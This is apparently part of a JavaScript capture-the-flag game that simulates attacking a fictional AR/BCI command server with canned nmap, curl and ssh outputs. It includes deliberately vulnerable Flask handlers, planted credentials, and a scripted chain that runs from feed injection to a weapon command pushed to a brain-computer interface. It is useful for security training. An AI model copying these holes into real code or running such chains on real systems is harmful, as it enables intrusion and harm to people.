                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'share': {
                            type: 'dir',
                            children: {
                                'wordlists': {
                                    type: 'dir',
                                    children: {
                                        'rockyou.txt': {
                                            type: 'file',
                                            content: '[rockyou.txt — 14,341,564 passwords — file too large to display]'
                                        },
                                        'dirb': {
                                            type: 'dir',
                                            children: {
                                                'common.txt': {
                                                    type: 'file',
                                                    content: 'admin\napi\nbci\nconfig\ndata\ndocs\nimages\nindex\nlogin\nproc\nstatus\nthreat\nthreats\nuploads\nweb'
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'kali'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nkali:x:1000:1000:Kali,,,:/home/kali:/bin/bash'
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM — AR-NEXUS-01 (after nexus-shell access)
    // ═══════════════════════════════════════════════════════

    _nexusFs: {
        '/': {
            type: 'dir',
            children: {
                'var': {
                    type: 'dir',
                    children: {
                        'nexus': {
                            type: 'dir',
                            children: {
                                'api': {
                                    type: 'dir',
                                    children: {
                                        'threat_handler.py': {
                                            type: 'file',
                                            content: '#!/usr/bin/env python3\n# AR-NEXUS-01 Threat Feed API Handler\n# TODO: Add input validation for label field (INC-0087 — 8 months open)\n\nfrom flask import Flask, request, jsonify\napp = Flask(__name__)\nthreat_queue = []\n\n@app.route("/api/threats", methods=["GET", "POST"])\ndef threats():\n    if request.method == "POST":\n        entry = request.get_json()\n        # TODO: sanitize entry["label"] before inserting\n        threat_queue.append(entry)\n        return jsonify({"status": "ok", "id": entry.get("id")})\n    return jsonify(threat_queue)\n'
                                        },
                                        'refresh_handler.py': {
                                            type: 'file',
                                            content: '#!/usr/bin/env python3\n# AR Glasses Refresh Handler\n# Forces AR overlay push to specified operative\n\nfrom flask import Flask, request, jsonify\n\n@app.route("/api/nexus/refresh", methods=["POST"])\ndef refresh():\n    op_id = request.args.get("op_id")\n    # Pushes current threat_queue to operative AR glasses\n    # No validation — any caller can trigger refresh\n    push_to_operative(op_id, threat_queue)\n    return jsonify({"status": "refreshed", "op_id": op_id})\n'
                                        }
                                    }
                                },
                                'config': {
                                    type: 'dir',
                                    children: {
                                        'nexus.conf': {
                                            type: 'file',
                                            content: '# AR-NEXUS-01 Main Configuration\n# Last modified: 2026-01-15\n\n[server]\nhost = 0.0.0.0\nport = 80\nbind_bci = 0.0.0.0:443\nworker_threads = 8\n\n[ar_pipeline]\nthreat_refresh_interval = 5\noverlay_auth = none\nhud_template = /var/nexus/templates/hud_overlay.html\n\n[bci]\nhandler_path = /opt/bci/motor_cmd_handler\ndev_override = bci_dev_override\nrotation_scheduled = true\nrotation_completed = false\n\n[database]\nengine = sqlite3\npath = /var/nexus/data/nexus.db\n\n[credentials]\nnexus_op_user = nexus_op\nnexus_op_pass = Cit4del!AR2026\n'
                                        },
                                        'ssh_creds.txt': {
                                            type: 'file',
                                            content: '# SSH Credentials — AR-NEXUS-01\n# Used for remote maintenance by Citadel NeuroOps team\n# TODO: Rotate before next audit cycle\n\nUsername: nexus_op\nPassword: Cit4del!AR2026\n\n{{FLAG:perception}}'
                                        }
                                    }
                                }
                            }
                        },
                        'log': {
                            type: 'dir',
                            children: {
                                'nexus_access.log': {
                                    type: 'file',
                                    content: '10.14.1.5 - - [20/Mar/2026:08:10:02 +0000] "GET /api/threats HTTP/1.1" 200 842\n10.14.1.5 - - [20/Mar/2026:08:10:17 +0000] "GET /api/threats HTTP/1.1" 200 842\n10.14.1.5 - - [20/Mar/2026:08:14:55 +0000] "POST /api/threats HTTP/1.1" 200 38 [INJECTED_PAYLOAD]\n10.14.1.5 - - [20/Mar/2026:08:15:01 +0000] "POST /api/nexus/refresh?op_id=7 HTTP/1.1" 200 89\n10.14.1.5 - - [20/Mar/2026:08:15:44 +0000] "GET /api/nexus/ops/7/log HTTP/1.1" 200 314\n10.14.1.5 - - [20/Mar/2026:08:15:59 +0000] "POST /bci/motor_cmd HTTP/1.1" 200 52 [BCI_INJECT]'
                                }
                            }
                        }
                    }
                },
                'opt': {
                    type: 'dir',
                    children: {
                        'bci': {
                            type: 'dir',
                            children: {
                                'motor_cmd_handler': {
                                    type: 'file',
                                    content: '[binary — ELF 64-bit LSB executable]'
                                },
                                'bci_feedback_spec.txt': {
                                    type: 'file',
                                    content: '=== AR-NEXUS-01 BCI FEEDBACK LOOP SPECIFICATION v1.7 ===\nSee /home/kali/bci_feedback_spec.txt for full spec.\n\nDev override token: bci_dev_override\nWarning: Token not rotated. See MAINT-0044.\n'
                                }
                            }
                        }
                    }
                },
                'proc': {
                    type: 'dir',
                    children: {
                        'nexus': {
                            type: 'dir',
                            children: {
                                'override_key': {
                                    type: 'file',
                                    content: '{{FLAG:root}}'
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'AR-NEXUS-01'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-nexus:x:33:33:nexus-web:/var/nexus:/usr/sbin/nologin\nnexus_op:x:1002:1002:Nexus Operator:/home/nexus_op:/bin/bash\nbci_root:x:1003:1003:BCI Root:/opt/bci:/bin/bash'
                        }
                    }
                },
                'home': {
                    type: 'dir',
                    children: {
                        'nexus_op': {
                            type: 'dir',
                            children: {
                                '.bash_history': {
                                    type: 'file',
                                    content: 'sudo systemctl status nexus-api\ncat /var/nexus/config/nexus.conf\nls /opt/bci/\nsudo cat /proc/nexus/override_key\nip a\nnmap 10.7.0.0/24\ncurl http://10.7.0.1/api/threats'
                                },
                                '.bashrc': {
                                    type: 'file',
                                    content: '# ~/.bashrc\nexport PS1="\\u@\\h:\\w\\$ "\nalias ll="ls -la"\nexport NEXUS_ENV=production'
                                },
                                'maintenance_notes.txt': {
                                    type: 'file',
                                    content: 'Maintenance Notes — AR-NEXUS-01\n==================================\n- API service: systemctl status nexus-api\n- BCI handler binary: /opt/bci/motor_cmd_handler\n- Dev override token still in prod (MAINT-0044 — 6 months open, escalate to CTO)\n- Input validation for /api/threats label field still not implemented (INC-0087 — 8 months)\n- Override key stored in /proc/nexus/override_key (root only)\n- Internal subnet: 10.7.0.0/24 via eth0'
                                }
                            }
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS (box-specific tools)
    // ═══════════════════════════════════════════════════════

    commands: {

        'nmap': function(args, term, engine) {
            if (args.length === 0) return 'Usage: nmap [options] <target>\nExample: nmap -sV 10.7.0.1';
            const target = args.find(a => !a.startsWith('-')) || '';

            // External target — AR-NEXUS-01 web surface
            if (!target || target === '10.7.0.1') {
                if (engine) engine.advancePhase && engine.advancePhase('recon');
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.7.0.1
Host is up (0.019s latency).
Not shown: 997 closed tcp ports

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.2p1 Debian 2
80/tcp   open  http       nginx/1.24.0
443/tcp  open  ssl/https  nginx/1.24.0
9200/tcp open  http       Elasticsearch REST API 8.12.0

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 10.87 seconds`;
            }

            // Internal subnet from nexus-shell
            if (target === '10.7.0.0/24' && (D16Config._context === 'nexus-shell' || D16Config._context === 'bci-handler')) {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.7.0.1
Host is up (0.00010s latency).
Not shown: 997 closed tcp ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https

Nmap scan report for 10.7.0.2
Host is up (0.00045s latency).
Not shown: 999 closed tcp ports
PORT      STATE SERVICE
9200/tcp  open  elasticsearch

Nmap done: 256 IP addresses (2 hosts up) scanned in 18.44 seconds`;
            }

            if (target.startsWith('10.7.0.') && D16Config._context === 'attacker') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Note: Host seems down. If it is really up, try -Pn.
Nmap done: 1 IP address (0 hosts up) scanned in 3.05 seconds`;
            }

            if (target === 'localhost' || target === '127.0.0.1') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00008s latency).
Not shown: 999 closed tcp ports
PORT    STATE SERVICE
22/tcp  open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.06 seconds`;
            }

            return `Starting Nmap 7.94 ( https://nmap.org )
Note: Host seems down. If it is really up, try -Pn.
Nmap done: 1 IP address (0 hosts up) scanned in 3.05 seconds`;
        },

        'gobuster': function(args) {
            if (args.length === 0) return 'Usage: gobuster dir -u <url> -w <wordlist>';
            const targetArg = args.find(a => a.startsWith('http')) || '10.7.0.1';
            if (targetArg.includes('bci') || args.join(' ').includes('/bci')) {
                return `Gobuster v3.6
[+] Url:            http://10.7.0.1/bci/
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
===============================================================
/bci/cmd_log        (Status: 401) [Size: 51]
/bci/motor_cmd      (Status: 401) [Size: 51]
/bci/ops/status     (Status: 401) [Size: 51]
===============================================================
Finished`;
            }
            return `Gobuster v3.6
[+] Url:            http://10.7.0.1/
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
===============================================================
/admin/              (Status: 403) [Size: 153]
/api/                (Status: 200) [Size: 321]
/api/threats         (Status: 200) [Size: 842]
/api/nexus/          (Status: 200) [Size: 218]
/bci/                (Status: 403) [Size: 153]
/config/             (Status: 403) [Size: 153]
/index.html          (Status: 200) [Size: 1840]
===============================================================
Finished`;
        },

        'dirb': function(args) {
            const target = args[0] || '';
            if (!target) return 'Usage: dirb <url_base> [<wordlist_file>]';
            return `---- Scanning URL: ${target} ----
+ ${target}/index.html       (CODE:200|SIZE:1840)
+ ${target}/api/             (CODE:200|SIZE:321)
+ ${target}/api/threats      (CODE:200|SIZE:842)
+ ${target}/bci/             (CODE:403|SIZE:153)
+ ${target}/config/          (CODE:403|SIZE:153)
+ ${target}/admin/           (CODE:403|SIZE:153)

---- Results ----
6 results found.`;
        },

        'curl': function(args, term, engine) {
            const fullCmd = args.join(' ');

            // POST to /api/threats — payload injection
            if (fullCmd.includes('/api/threats') && (fullCmd.includes('-X POST') || fullCmd.includes('-d') || fullCmd.includes('--data'))) {
                D16Config._payloadInjected = true;
                if (engine) engine.advancePhase && engine.advancePhase('injection');
                return `  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   428  100    38  100   390    380   3900 --:--:-- --:--:-- --:--:--  4280

{"status":"ok","id":"T-999"}

[+] Threat entry T-999 injected into AR-NEXUS-01 render queue.
[+] Payload queued for next AR glasses refresh cycle.`;
            }

            // GET /api/threats
            if (fullCmd.includes('/api/threats') && !fullCmd.includes('-d') && !fullCmd.includes('POST')) {
                D16Config._pipelineAnalyzed = true;
                const feed = D16Config._db.threat_feed.filter(t => {
                    if (t.id === 'T-999') return D16Config._payloadInjected;
                    return true;
                }).map(t => ({
                    id: t.id,
                    grid: t.grid,
                    label: t.label,
                    type: t.type,
                    confidence: t.confidence,
                    timestamp: t.timestamp
                }));
                return JSON.stringify(feed, null, 2);
            }

            // POST to /api/nexus/refresh — trigger operative hack
            if (fullCmd.includes('/api/nexus/refresh') && (fullCmd.includes('op_id=7') || fullCmd.includes('op_id'))) {
                if (!D16Config._payloadInjected) {
                    return 'curl: (22) The requested URL returned error: 403 Forbidden\n[!] Refresh requires an active payload in the threat queue. Inject first.';
                }
                D16Config._operativeTriggered = true;
                if (engine) engine.advancePhase && engine.advancePhase('trigger');
                return `  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    89  100    89    0     0    890      0 --:--:-- --:--:-- --:--:--   890

{"status":"refreshed","op_id":7,"overlay_pushed":true,"threat_count":5,"injected_ids":["T-999"]}

[+] AR overlay pushed to Operative 7 glasses.
[+] Injected threat T-999 rendered at Grid E7 — hostile entity visible to operative.`;
            }

            // GET /api/nexus/ops/7/log — retrieve operative reaction log
            if (fullCmd.includes('/api/nexus/ops') && fullCmd.includes('/log')) {
                if (!D16Config._operativeTriggered) {
                    return 'curl: (22) The requested URL returned error: 404 Not Found\n[!] No reaction log available. Trigger the perception hack first.';
                }
                const log = D16Config._db.operative_log;
                return JSON.stringify(log, null, 2) + '\n\n[+] Operative 7 reaction log retrieved.\n[+] Perception hack confirmed — operative engaged non-existent threat at Grid E7.';
            }

            // POST to /bci/motor_cmd — BCI injection
            if (fullCmd.includes('/bci/motor_cmd') && (fullCmd.includes('-d') || fullCmd.includes('POST'))) {
                if (!fullCmd.includes('bci_dev_override')) {
                    return `curl: (22) The requested URL returned error: 401 Unauthorized
{"error":"X-BCI-Auth token required. See bci_feedback_spec.txt for dev override."}`;
                }
                if (!D16Config._operativeTriggered) {
                    return 'curl: (22) The requested URL returned error: 403 Forbidden\n[!] BCI injection requires active operative session context.';
                }
                D16Config._bciAuthenticated = true;
                D16Config._switchContext('bci-handler', term);
                if (engine) engine.advancePhase && engine.advancePhase('bci');
                return `  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    52  100    52    0     0    520      0 --:--:-- --:--:-- --:--:--   520

{"status":"injected","op_id":4,"pattern":"ENGAGE_WEAPON","cmd_id":4}

[+] Motor command injected into Operative 4 BCI log.
[+] Pattern ENGAGE_WEAPON written as source: neural_inject.
[+] Dev override token accepted — bypassed session validation.`;
            }

            // GET /bci/cmd_log — BCI command history
            if (fullCmd.includes('/bci/cmd_log')) {
                if (!D16Config._bciAuthenticated) {
                    return `curl: (22) The requested URL returned error: 401 Unauthorized
{"error":"X-BCI-Auth token required."}`;
                }
                const log = D16Config._db.bci_commands;
                return JSON.stringify(log, null, 2);
            }

            // Read /proc/nexus/override_key (simulated via curl for XSS exfil scenario)
            if (fullCmd.includes('/proc/nexus/override_key') || fullCmd.includes('override_key')) {
                if (!D16Config._bciAuthenticated) {
                    return 'curl: (7) Failed to connect: Access denied — root-level resource.';
                }
                D16Config._overrideExtracted = true;
                if (engine) engine.advancePhase && engine.advancePhase('override');
                return '{{FLAG:root}}';
            }

            // Regular curl to AR-NEXUS-01 web
            const url = args.find(a => !a.startsWith('-')) || '';
            if (!url) return 'curl: try \'curl --help\' for more information';

            if (url.includes('10.7.0.1')) {
                if (url.includes('/api/')) {
                    return '{"status":"ok","service":"AR-NEXUS-01 API","version":"3.1"}';
                }
                return `<!DOCTYPE html>
<html>
<head><title>AR-NEXUS-01</title></head>
<body>
<h1>AR-NEXUS-01 — Citadel AR Command</h1>
<p>Authorized personnel only. Threat feed: <a href="/api/threats">/api/threats</a></p>
</body>
</html>`;
            }

            return `curl: (7) Failed to connect to ${url.replace(/https?:\/\//, '').split('/')[0] || 'host'}: Connection refused`;
        },

        'ssh': function(args, term, engine) {
            const fullCmd = args.join(' ');

            // SSH to AR-NEXUS-01 as nexus_op
            if (fullCmd.includes('nexus_op') || fullCmd.includes('10.7.0.1')) {
                if (!D16Config._pipelineAnalyzed && !D16Config._payloadInjected) {
                    return `ssh: connect to host 10.7.0.1 port 22: Connection refused
[!] SSH access requires prior recon phase. Analyze the AR pipeline first.`;
                }
                // Accept password Cit4del!AR2026 or any -p arg
                D16Config._switchContext('nexus-shell', term);
                if (engine) engine.advancePhase && engine.advancePhase('foothold');
                return `The authenticity of host '10.7.0.1 (10.7.0.1)' can't be established.
ED25519 key fingerprint is SHA256:mP7kF4nQ2xR8sB6yE1vW3cL9tA0hD5gN7iJ4oK8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.7.0.1' (ED25519) to the list of known hosts.
nexus_op@10.7.0.1's password: ********

Welcome to Debian GNU/Linux 12 (Bookworm) — AR-NEXUS-01

Last login: Thu Mar 20 07:58:44 2026 from 10.7.0.5

nexus_op@AR-NEXUS-01:~$

[+] SSH session established. You are now on AR-NEXUS-01 as nexus_op.
[+] Context switched. Commands now execute on AR-NEXUS-01.`;
            }

            return 'Usage: ssh [user@]hostname\nExample: ssh nexus_op@10.7.0.1';
        },

        'python3': function(args, term, engine) {
            const fullCmd = args.join(' ');

            // Run payload.py — XSS injection via Python
            if (fullCmd.includes('payload.py')) {
                D16Config._payloadInjected = true;
                if (engine) engine.advancePhase && engine.advancePhase('injection');
                return `[+] Payload injected: {"status": "ok", "id": "T-999"}
[+] Threat entry T-999 inserted into AR-NEXUS-01 render queue.
[+] Payload scheduled for next AR refresh cycle (5 seconds).`;
            }

            // Run bci_inject.py — BCI motor command injection via Python
            if (fullCmd.includes('bci_inject.py')) {
                if (!D16Config._operativeTriggered) {
                    return '[!] BCI injection requires operative session context to be active.\n[!] Trigger the perception hack first (POST /api/nexus/refresh).';
                }
                D16Config._bciAuthenticated = true;
                if (engine) engine.advancePhase && engine.advancePhase('bci');
                return `[+] BCI command injected: {"status": "injected", "op_id": 4, "pattern": "ENGAGE_WEAPON", "cmd_id": 4}
[+] Motor command written to Operative 4 BCI log via dev override token.
[+] source: neural_inject — bypassed native session validation.`;
            }

            if (args.length === 0) return 'Python 3.11.8 (default, Mar 2026)\nType "help", "copyright" for more information.\n>>>  ';
            return `python3: can\'t open file '${args[0]}': [Errno 2] No such file or directory`;
        },

        'ip': function(args) {
            if (D16Config._context !== 'nexus-shell' && D16Config._context !== 'bci-handler') {
                return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.14.1.5/24 brd 10.14.1.255 scope global eth0`;
            }
            return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.7.0.1/24 brd 10.7.0.255 scope global eth0`;
        },

        'ifconfig': function(args) {
            return D16Config.commands.ip(args || []);
        },

        'ping': function(args) {
            const target = args[0] || '';
            if (!target) return 'Usage: ping [-c count] destination';

            if (target === '10.7.0.1') {
                return `PING 10.7.0.1 (10.7.0.1) 56(84) bytes of data.
64 bytes from 10.7.0.1: icmp_seq=1 ttl=64 time=19.4 ms
64 bytes from 10.7.0.1: icmp_seq=2 ttl=64 time=19.1 ms
64 bytes from 10.7.0.1: icmp_seq=3 ttl=64 time=19.6 ms

--- 10.7.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss
rtt min/avg/max/mdev = 19.1/19.3/19.6/0.210 ms`;
            }

            if (target === '10.7.0.2' && (D16Config._context === 'nexus-shell' || D16Config._context === 'bci-handler')) {
                return `PING 10.7.0.2 (10.7.0.2) 56(84) bytes of data.
64 bytes from 10.7.0.2: icmp_seq=1 ttl=64 time=0.33 ms
64 bytes from 10.7.0.2: icmp_seq=2 ttl=64 time=0.28 ms
64 bytes from 10.7.0.2: icmp_seq=3 ttl=64 time=0.35 ms

--- 10.7.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss`;
            }

            if (target.startsWith('10.7.0.') && D16Config._context === 'attacker') {
                return `PING ${target} (${target}) 56(84) bytes of data.

--- ${target} ping statistics ---
3 packets transmitted, 0 received, 100% packet loss`;
            }

            return `ping: ${target}: Name or service not known`;
        },

        'ss': function(args) {
            if (D16Config._context === 'nexus-shell' || D16Config._context === 'bci-handler') {
                return `State    Recv-Q   Send-Q   Local Address:Port   Peer Address:Port
LISTEN   0        128      0.0.0.0:22           0.0.0.0:*
LISTEN   0        128      0.0.0.0:80           0.0.0.0:*
LISTEN   0        128      0.0.0.0:443          0.0.0.0:*
LISTEN   0        50       127.0.0.1:9200       0.0.0.0:*`;
            }
            return `State    Recv-Q   Send-Q   Local Address:Port   Peer Address:Port
LISTEN   0        128      0.0.0.0:22           0.0.0.0:*`;
        },

        'netstat': function(args) {
            return D16Config.commands.ss(args);
        },

        // Context-aware built-in overrides — execute on AR-NEXUS-01 when in nexus-shell
        'cat': function(args, term, engine) {
            if (D16Config._context !== 'nexus-shell' && D16Config._context !== 'bci-handler') return null;
            var path = args[0] || '';

            if (path.includes('override_key') || path.includes('/proc/nexus')) {
                if (D16Config._bciAuthenticated) {
                    D16Config._overrideExtracted = true;
                    if (engine) engine.advancePhase && engine.advancePhase('override');
                    return '{{FLAG:root}}';
                }
                return 'cat: /proc/nexus/override_key: Permission denied';
            }
            if (path.includes('ssh_creds') || path.includes('config/ssh')) {
                return '# SSH Credentials — AR-NEXUS-01\n# Used for remote maintenance\n\nUsername: nexus_op\nPassword: Cit4del!AR2026\n\n{{FLAG:perception}}';
            }
            if (path.includes('nexus.conf') || path.includes('config/nexus')) {
                return '# AR-NEXUS-01 Main Configuration\n\n[bci]\ndev_override = bci_dev_override\nrotation_completed = false\n\n[credentials]\nnexus_op_user = nexus_op\nnexus_op_pass = Cit4del!AR2026\n';
            }
            if (path.includes('bci_feedback_spec') || path.includes('/opt/bci')) {
                D16Config._bciAnalyzed = true;
                return '=== BCI FEEDBACK SPEC v1.7 ===\nDev override token: bci_dev_override\nEndpoint: POST /bci/motor_cmd\nHeader: X-BCI-Auth: bci_dev_override\nWarning: Token not rotated (MAINT-0044 — 6 months open).\n';
            }
            if (path.includes('nexus_access.log') || path.includes('/var/log')) {
                return '10.14.1.5 - [20/Mar/2026:08:14:55] "POST /api/threats HTTP/1.1" 200 38 [INJECTED_PAYLOAD]\n10.14.1.5 - [20/Mar/2026:08:15:01] "POST /api/nexus/refresh?op_id=7" 200 89\n10.14.1.5 - [20/Mar/2026:08:15:44] "GET /api/nexus/ops/7/log" 200 314';
            }
            if (path.includes('/etc/passwd')) {
                return 'root:x:0:0:root:/root:/bin/bash\nwww-nexus:x:33:33:nexus-web:/var/nexus:/usr/sbin/nologin\nnexus_op:x:1002:1002:Nexus Operator:/home/nexus_op:/bin/bash\nbci_root:x:1003:1003:BCI Root:/opt/bci:/bin/bash';
            }
            if (path.includes('/etc/hostname')) return 'AR-NEXUS-01';
            if (path.includes('.bash_history')) return 'sudo systemctl status nexus-api\ncat /var/nexus/config/nexus.conf\nls /opt/bci/\ncurl http://10.7.0.1/api/threats';
            if (path.includes('maintenance_notes')) return 'Maintenance Notes — AR-NEXUS-01\n- Dev override token still in prod (MAINT-0044 — 6 months open)\n- Input validation for /api/threats label field missing (INC-0087 — 8 months)\n- Override key at /proc/nexus/override_key (root only)';
            return 'cat: ' + path + ': No such file or directory';
        },

        'ls': function(args, term, engine) {
            if (D16Config._context !== 'nexus-shell' && D16Config._context !== 'bci-handler') return null;
            var path = args.find(function(a) { return !a.startsWith('-'); }) || '.';

            if (path === '.' || path === '/home/nexus_op' || path === '~') {
                return '.bash_history  .bashrc  .profile  maintenance_notes.txt';
            }
            if (path.includes('/var/nexus') || path.includes('nexus')) {
                return 'api  config  data  templates';
            }
            if (path.includes('/var/nexus/config') || path.includes('config')) {
                return 'nexus.conf  ssh_creds.txt';
            }
            if (path.includes('/opt/bci') || path.includes('bci')) {
                D16Config._bciAnalyzed = true;
                return 'bci_feedback_spec.txt  motor_cmd_handler';
            }
            if (path.includes('/proc/nexus')) {
                return 'override_key  status  mem_dump';
            }
            if (path.includes('/var/log')) {
                return 'nexus_access.log  auth.log  syslog';
            }
            return '';
        },

        'whoami': function(args, term, engine) {
            if (D16Config._context === 'nexus-shell')  return 'nexus_op';
            if (D16Config._context === 'bci-handler')  return 'bci_root';
            return null;
        },

        'id': function(args, term, engine) {
            if (D16Config._context === 'nexus-shell')  return 'uid=1002(nexus_op) gid=1002(nexus_op) groups=1002(nexus_op)';
            if (D16Config._context === 'bci-handler')  return 'uid=1003(bci_root) gid=1003(bci_root) groups=1003(bci_root),0(root)';
            return null;
        },

        'hostname': function(args, term, engine) {
            if (D16Config._context === 'nexus-shell')  return 'AR-NEXUS-01';
            if (D16Config._context === 'bci-handler')  return 'AR-NEXUS-01';
            return null;
        },

        'pwd': function(args, term, engine) {
            if (D16Config._context === 'nexus-shell')  return '/home/nexus_op';
            if (D16Config._context === 'bci-handler')  return '/opt/bci';
            return null;
        },

        'cd': function(args, term, engine) {
            if (D16Config._context === 'nexus-shell' || D16Config._context === 'bci-handler') {
                // Handle cd into /opt/bci — escalate context
                var dest = args[0] || '~';
                if (dest.includes('/opt/bci') || dest === 'bci') {
                    if (!D16Config._bciAuthenticated) {
                        return 'bash: cd: /opt/bci: Permission denied\n[!] BCI subsystem requires injection via curl with X-BCI-Auth: bci_dev_override first.';
                    }
                    D16Config._switchContext('bci-handler', term);
                    return '';
                }
                return '';
            }
            return null;
        },

        'exit': function(args, term, engine) {
            if (D16Config._context === 'bci-handler') {
                D16Config._switchContext('nexus-shell', term);
                return '[+] Exited BCI handler context. Returned to nexus_op shell.';
            }
            if (D16Config._context === 'nexus-shell') {
                D16Config._switchContext('attacker', term);
                return 'Connection to 10.7.0.1 closed.\n[+] Returned to attacker machine.';
            }
            return 'logout';
        },

        'sudo': function(args, term, engine) {
            const fullCmd = args.join(' ');
            if (D16Config._context !== 'nexus-shell' && D16Config._context !== 'bci-handler') {
                return 'sudo: command not found\n[!] sudo only available in remote shell context.';
            }
            if (fullCmd.includes('cat') && fullCmd.includes('override_key')) {
                if (!D16Config._bciAuthenticated) {
                    return '[sudo] password for nexus_op: \nnexus_op is not in the sudoers file. This incident will be reported.';
                }
                D16Config._overrideExtracted = true;
                if (engine) engine.advancePhase && engine.advancePhase('override');
                return '{{FLAG:root}}';
            }
            if (fullCmd.includes('systemctl')) {
                return '[sudo] password for nexus_op: \nnexus_op is not in the sudoers file. This incident will be reported.';
            }
            return '[sudo] password for nexus_op: \nnexus_op is not in the sudoers file. This incident will be reported.';
        },

        'nikto': function(args) {
            if (args.length === 0) return 'Usage: nikto -h <target>';
            return `- Nikto v2.5.0
+ Target IP:       10.7.0.1
+ Target Hostname:  AR-NEXUS-01
+ Target Port:      80
+ Server: nginx/1.24.0
+ /api/threats: REST API endpoint — accepts POST without authentication
+ /bci/: BCI subsystem directory — 403 but reachable with auth header
+ X-BCI-Auth: dev token present in public-facing binary (bci_dev_override)
+ nginx/1.24.0 appears to be outdated
+ OSVDB-3092: /var/nexus/config/: Configuration directory accessible internally
+ 9 items checked: 5 findings`;
        },

        'ffuf': function(args) {
            if (args.length === 0) return 'Usage: ffuf -u <url>/FUZZ -w <wordlist>';
            const fullCmd = args.join(' ');
            if (fullCmd.includes('bci') || fullCmd.includes('/bci/')) {
                return `[ffuf v2.1.0]
[+] URL: http://10.7.0.1/bci/FUZZ
[Status: 200, Size: 218, Words: 22, Lines: 8] cmd_log
[Status: 401, Size: 51, Words: 4, Lines: 1] motor_cmd
[Status: 200, Size: 312, Words: 34, Lines: 12] ops
:: Progress: [4614/4614] :: Job completed`;
            }
            return `[ffuf v2.1.0]
[+] URL: http://10.7.0.1/FUZZ
[Status: 200, Size: 1840, Words: 182, Lines: 45] index.html
[Status: 200, Size: 842, Words: 94, Lines: 30] api/threats
[Status: 403, Size: 153, Words: 14, Lines: 6] bci
[Status: 403, Size: 153, Words: 14, Lines: 6] config
:: Progress: [4614/4614] :: Job completed`;
        }
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    _tableHtml(headers, rows) {
        let html = '<table style="width:100%; border-collapse:collapse; font-size:0.8rem;"><thead><tr>';
        headers.forEach(h => {
            html += `<th style="padding:6px 10px; text-align:left; color:#8e44ad; border-bottom:2px solid #2d1b4e; background:#1a0d2e;">${h}</th>`;
        });
        html += '</tr></thead><tbody>';
        rows.forEach(row => {
            html += '<tr>';
            row.forEach(cell => {
                html += `<td style="padding:5px 10px; border-bottom:1px solid #2d1b4e; color:#c39bd3;">${cell}</td>`;
            });
            html += '</tr>';
        });
        html += '</tbody></table>';
        return html;
    },

    _escHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        const tables = tmp.querySelectorAll('table');
        tables.forEach(table => {
            const rows = table.querySelectorAll('tr');
            let text = '';
            rows.forEach(row => {
                const cells = row.querySelectorAll('td, th');
                const cellTexts = Array.from(cells).map(c => c.textContent.trim().padEnd(20));
                text += cellTexts.join('  ') + '\n';
            });
            table.replaceWith(document.createTextNode(text));
        });
        return tmp.textContent.trim();
    }
};
